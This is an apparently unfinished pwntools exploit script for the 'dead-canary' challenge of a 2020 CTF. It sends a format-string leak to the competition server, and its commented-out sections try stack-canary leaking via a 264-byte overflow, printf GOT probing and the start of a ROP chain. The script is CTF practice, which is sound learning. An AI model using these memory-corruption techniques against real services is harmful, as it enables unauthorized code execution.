from pwn import *

p=remote('2020.redpwnc.tf', 31744)
#p= process('./dead-canary')

printf_got = 0x601000
pop_rdi    = 0x00000000004008e3

print(p.recvuntil('name: '))

payload = '%41$p'
p.sendline(payload)
p.interactive()

'''
def CanaryLeak(n):
    payload = 'A'*n
    p.sendline(payload)
    print(p.recvuntil('A'*n))
    print(p.recv(7))
    canary = u64(p.recv(7).ljust(8,'\x00')) 
    return canary
leak_ca= CanaryLeak(264)
log.info('Canary :' + hex(leak_ca))
#noticed that only at odd interval we can write the address using format string bug

payload = ''
#payload += '\x60\x10\x38'
payload += p64(printf_got)
payload += 'BBBB'
#payload += p64(printf_got+2)
payload += 'DDDD'
payload += 'EEEE'
payload += '%5$x'
payload += '%6$x'
payload += '%7$x'
payload += '%8$x'

print(payload)
payload = ''
payload += 'A'*264 #p64(printf_got)
payload += p64(leak_ca)
payload += 'A'*8
payload += p64(pop_rdi)

p.sendline(payload)


for i in range(10):
    p= process('./dead-canary')
    print(p.recvuntil('name: '))
    print(str(i))
    print(p.sendline('\x00\x10\x60' + '%' + str(i) + '$p'))
    sleep(1)
    print(p.recv())
    sleep(1)
'''
